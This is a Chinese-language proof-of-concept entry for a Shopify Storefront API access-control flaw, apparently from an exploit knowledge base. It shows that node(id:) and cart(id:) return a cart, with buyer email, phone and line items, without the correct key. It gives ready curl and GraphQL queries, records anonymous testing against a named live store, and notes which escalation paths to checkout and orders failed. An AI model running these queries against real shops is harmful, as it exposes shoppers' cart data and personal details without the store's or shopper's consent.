# Shopify Storefront API node(id:) 同样忽略 Cart 的 ?key（读路径不止 cart(id:)，且 Checkout 对象不可读）

- **code**: shopify-storefront-node-id-also-ignores-cart-key
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront API（/api/graphql，node(id:) / cart(id:)）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 goffsgames.co.uk /api/graphql 匿名实测：node(id:"gid://shopify/Cart/<handle>") 不带 key → 200 返回完整 cart；带 ?key=wrongkey 仍返回同一 cart；随机 handle → node:null。三端点 queryType 均无 checkout 字段、Checkout 不在 Node possibleTypes、node(Checkout GID)→invalid id；node(Order/<n>) 与 cartCompletionAttempt → ACCESS_DENIED(需 unauthenticated_read_customers)；/cart/c/<handle> web 通道对 key 是校验的。
- **path**: pocs/shopify-storefront-node-id-also-ignores-cart-key/poc.md
- **tags**: shopify,storefront-api,graphql,unauthorized,idor,cart,key,node,checkout,order
- **created_at**: 2026-11-11T15:03:34.046Z
- **engine**: goffsgames.co.uk

## 描述

补充 KB#524：Shopify Storefront API 忽略 Cart ?key 的读路径不止 cart(id:)，node(id:"gid://shopify/Cart/<handle>") 同样忽略 ?key，两者是独立读路径、共用同一缺陷。同时给出边界：Checkout 对象在 Storefront API 上不可读（无 checkout 查询字段、非 Node possibleTypes、node(Checkout GID)→invalid id），Order 与 cartCompletionAttempt 读被 unauthenticated_read_customers 作用域门禁，/cart/c/<handle> web 通道正常校验 key。读路径不泄露写 key。

## 用法

```
前置：目标 Shopify 托管店，Storefront API 匿名可达（POST /api/graphql）。需要 Cart 的 25 位 handle。
关键：读 Cart 有两条路径——`cart(id:)` 与 `node(id:)`——**都**忽略 id 里的 `?key`（带错误 key 仍返回同一 cart 即判据）。
决定性命中示例（无 token）：
curl -sk 'https://<shop>/api/graphql' -H 'Content-Type: application/json' -d '{"query":"{ node(id:\"gid://shopify/Cart/<HANDLE>\"){ ... on Cart{ id totalQuantity cost{totalAmount{amount currencyCode}} } } }"}'
-> 200 {"data":{"node":{"id":"...","totalQuantity":1,...}}}
别浪费时间的方向：Storefront 上找不到 checkout 对象（无 checkout 字段/非 Node 类型/node(Checkout GID)→invalid id）；Order 与 cartCompletionAttempt 需要 unauthenticated_read_customers 作用域（ACCESS_DENIED）；/cart/c/<handle> web 通道是校验 key 的。读路径不泄露写 key（checkoutUrl 无 key 返回）。
```

## 正文

```
# Shopify Storefront API：node(id:) 也忽略 Cart 的 ?key（读路径不止 cart(id:)）

承接 KB#524（cart(id:) 忽略 ?key）。补充两点：① 读路径的另一入口 `node(id:)` 同样忽略 ?key；② 升级到 checkout/order 是被结构性封死的，别在 Storefront 上白试。

## 前提
同 KB#524：目标为 Shopify 托管店、Storefront API 匿名可达；需要目标 Cart 的 25 位 handle。

## 复现（对照基线）
```
POST /api/graphql   (无 token，Content-Type: application/json)

# 自建 cart 拿 handle（id 带 ?key=，仅创建响应里有）
mutation{ cartCreate(input:{lines:[{merchandiseId:"gid://shopify/ProductVariant/<VAR>",quantity:1}]}){ cart{ id checkoutUrl } } }

# 读路径 1（KB#524）：不带 key / 错误 key 均命中
{ cart(id:"gid://shopify/Cart/<HANDLE>"){ id totalQuantity } }
{ cart(id:"gid://shopify/Cart/<HANDLE>?key=wrongkey"){ id totalQuantity } }

# 读路径 2（本条新增）：node(id:) 同样忽略 key
{ node(id:"gid://shopify/Cart/<HANDLE>"){ ... on Cart{ id totalQuantity cost{totalAmount{amount currencyCode}} checkoutUrl } } }
{ node(id:"gid://shopify/Cart/<HANDLE>?key=wrongkey"){ ... on Cart{ id totalQuantity } } }
 -→ 两条都 200 返回同一 cart；若 key 被校验，带错误 key 应为 cart:null / node:null

# 阴性对照
{ node(id:"gid://shopify/Cart/AAAAAAAAAAAAAAAAAAAAAAAAA"){ id } }  -> node:null
```

## 边界（为什么无法升级）
- **Checkout 对象不可读**：三端点（/api/graphql、/api/2026-01/graphql.json、/api/unstable/graphql.json）`queryType` 均无 `checkout` 字段；`Node.possibleTypes` 无 `Checkout`；`node(id:"gid://shopify/Checkout/<handle>")` → `{"errors":["invalid id"]}`（带/不带 key 相同）。→ checkout 升级在 Storefront 上无从下手。
- **Order 被门禁**：`node(id:"gid://shopify/Order/<n>")` → `ACCESS_DENIED`（Required access: `unauthenticated_read_customers`）。
- **cartCompletionAttempt 被门禁**：`{ cartCompletionAttempt(attemptId:"<id>"){...} }` → `ACCESS_DENIED`（字段级），换 attemptId 无差别。
- **web 通道正常**：cart 的 `checkoutUrl` `/cart/c/<handle>` 校验 key——不带/错误 key → 302 到**不同 handle**的新 checkout；正确 key → 302 保留原 handle。
- **不泄露写 key**：匿名读返回的 `checkoutUrl` 为**无 key**形式，带 key 的 URL 只在 cartCreate 响应里；读路径拿不到 key，写仍被卡。

## 读面上限（仅凭 handle）
可读：id/totalQuantity/note/attributes/buyerIdentity{email,phone,countryCode}/cost/lines(含 variant title/sku/price)/deliveryGroups。
`buyerIdentity.customer` → ACCESS_DENIED。匿名 cart 的 email/phone 为 null（已登录买家的 cart 才会有值 → 潜在 PII）。

## handle 可获得性
无公开枚举/公开面泄露；依赖外部泄漏（被分享的 cart/checkout 链接、Referer、日志/analytics）——故影响维持 low。

## 失败常见原因
同 KB#524：Storefront token 未公开/被关（401/403 或 HTML）；handle 非 25 位 base62；GID 前缀必须 `gid://shopify/Cart/`；必须 POST + `Content-Type: application/json`；key 作为 id 参数的一部分传入。

```
